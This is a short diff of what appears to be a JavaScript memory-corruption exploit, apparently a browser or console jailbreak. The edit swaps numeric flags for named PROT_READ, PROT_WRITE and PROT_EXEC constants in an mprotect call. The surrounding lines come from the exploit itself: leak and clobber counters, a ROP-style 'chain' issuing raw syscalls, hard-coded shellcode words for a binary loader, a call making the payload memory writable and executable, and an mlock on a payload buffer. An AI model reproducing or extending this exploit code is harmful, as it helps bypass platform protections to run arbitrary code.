@@ -139,6 +139,10 @@ const leak_len = 16;
 const num_leaks = 5;
 const num_clobbers = 8;
 
+const PROT_READ = 1;
+const PROT_WRITE = 2;
+const PROT_EXEC = 4;
+
 let chain = null;
 var nogc = [];
 
@@ -1667,7 +1671,7 @@ function runBinLoader() {
     BLDR[57] = 0x48C3050F; BLDR[58] = 0x006AC0C7; BLDR[59] = 0x89490000;
     BLDR[60] = 0xC3050FCA;
 
-    chain.sys('mprotect', payload_loader, 0x4000, (0x1 | 0x2 | 0x4));
+    chain.sys('mprotect', payload_loader, 0x4000, (PROT_READ | PROT_WRITE | PROT_EXEC));
 
     var pthread = malloc(0x10);
     sysi('mlock', payload_buffer, 0x300000);
